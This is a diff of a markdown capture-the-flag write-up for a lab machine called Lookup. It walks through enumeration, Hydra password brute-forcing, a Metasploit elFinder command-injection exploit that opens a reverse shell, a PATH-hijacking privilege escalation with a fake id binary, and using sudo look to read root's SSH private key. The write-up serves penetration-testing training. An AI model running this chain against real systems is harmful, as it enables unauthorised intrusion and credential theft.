@@ -1,5 +1,6 @@
 ### Intro
 _Lookup_ features real-world vulnerabilities like web app flaws and privilege escalation. It teaches key skills such as reconnaissance, enumeration, command injection, and scripting for automation—offering valuable experience in penetration testing and secure coding practices.
+### Enumeration
 #### Nmap
 ```bash
 nmap -p- -A 10.10.248.120
@@ -53,7 +54,6 @@ nmap -p80 --script http-enum <IP>
 ```
 
 Now that we have managed to find the login page, we can try to `brute-force` this page. Before finding passwords we need to find users in the website. One of the users is `admin`, we can confirm that from earlier error message. We can use a Python script to find users.
-
 #### Python Script to Enumerate Users
 ```python
 import requests
@@ -107,14 +107,16 @@ if __name__ == "__main__":
     main()
 ```
 
-Note: `Make sure to use the domain name instead of the IP address.` We have managed to extract two usernames `admin` and `jose`. Now, it's time to brute-force the password for these users.
+We have managed to extract two usernames `admin` and `jose`. Now, it's time to brute-force the password for these users.
+![[Python_Script.png]]
 
 #### Brute Force with Hydra
 ```bash
 hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form '/login.php:username=jose&password=^PASS^:F=Wrong' -t 32
 ```
-- Password is `password123.`
 
+We've managed to crack the password of the user `jose` and the password is `password123`.
+![[Hydra_Password_Brute_Force.png]]
 We now use these credentials to login in but like earlier we get nothing. When we inspect the `Network` tab and login with the creds again, we get a new subdomain `files.lookup.thm`. 
 
 This technique is called `Virtual Hosting`, where multiple domain names are hosted on the same IP. The web server uses the `Host header in the HTTP request` to determine which site to server.
@@ -127,4 +129,115 @@ sudo vim /etc/hosts
 IP     files.lookup.thm
 ```
 
-Once that is done, refresh the page and we are inside the website. There are a lot of files and we can check all of them. 
+Once that is done, refresh the page and we are inside the website. There are a lot of files and we can check all of them. However, the files do no contain anything special. So, we check the software and it's version. We can see that it is `elFinder` and it is using the version `2.1.47`. With this information, we can search for it.![[Vulnerable_Software.png]]
+
+#### Search for the Vulnerability
+```bash
+searchsploit elfinder 2.1.47
+```
+
+We can see there are a few vulnerabilities showed up.
+![[Searchsploit.png]]
+
+### Initial Access
+#### Msfconsole
+```bash
+search elfinder type:exploit
+use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection 
+set rhosts files.lookup.thm
+set lhosts <IP>
+run
+```
+
+![[msfconsole.png]]
+
+Using the vulnerability, we have managed to get a reverse meterpreter shell. Now, it's time for privilege escalation.
+
+### Privilege Escalation
+#### Shell Stabilization
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+We checked if we're in the sudoers list but we aren't. Next, I checked the SUID permissions.
+
+#### Search for SUID permissions
+```bash
+find / -perm -4000 2>/dev/null
+```
+- `/usr/bin/at` and `/usr/sbin/pwm` looked interesting but the `/usr/bin/at` didn't work. Now, it's time to dig into `/usr/sbin/pwm` in depth.
+
+We ran the binary and got the following output where it is running the `id` binary and looking for the `.password` file under the user home.
+![[User_priv_esc.png]]
+
+#### Go inside the Home folder to Find Users
+```bash
+cd /home
+```
+
+There are 3 different users. I checked inside those users for the `.password` file.
+
+```bash
+ls -al think
+```
+
+The user `think` has the `.password` file that could contain the password of the user.
+![[password_file.png]]
+
+Now, we need to escalate our privileges to the `think` user to read that file. Since, the `/usr/sbin/pwm` is executing the `id` binary we can use this to escalate our privileges.
+
+#### Create a fake ID binary under /tmp folder and give Executable permissions
+```bash
+echo -e '#!/bin/bash\necho "uid=33(think) gid=33(www-data) groups=33(www-data)"' > id && chmod +x id
+```
+
+Once the fake binary is created, we need to export the `/tmp` folder at the beginning so that our fake `id` runs instead of the real one.
+```bash
+export PATH=/tmp:$PATH
+echo $PATH
+```
+
+Now, it's time to run the `/usr/sbin/pwm` binary and once we do that we can see the password list. Save the list to your local machine to brute-force the password.
+
+#### Brute-Force the password list
+```bash
+hydra -l think -P pass-list ssh://lookup.thm -t 32                                                                                  
+```
+![[password-Brute_Force.png]]
+Once we successfully crack the password for the `think` user, it's time to ssh into the machine.
+
+#### SSH
+```bash
+ssh think@lookup.thm
+```
+
+We can now read the `user.txt` flag.
+
+Now, it's time to escalate our privileges to root. 
+```bash
+sudo -l
+```
+
+We find the following binary that is run as root. However, it doesn't have SUID permissions. This binary seems to read files, follow GTFOBins for more.
+![[look.png]]
+
+#### Read Files with Look
+**To just read the `root.txt`**
+```bash
+sudo look '' /root/root.txt
+```
+
+**Read the `/root/.ssh/id_rsa` private key
+```bash
+sudo look '' /root/.ssh/id_rsa
+```
+
+Save the file in your local machine and and changed the permissions.
+```bash
+chmod 600 id_rsa
+```
+
+#### ssh using that key
+```bash
+ssh -i id_rsa root@lookup.thm
+```
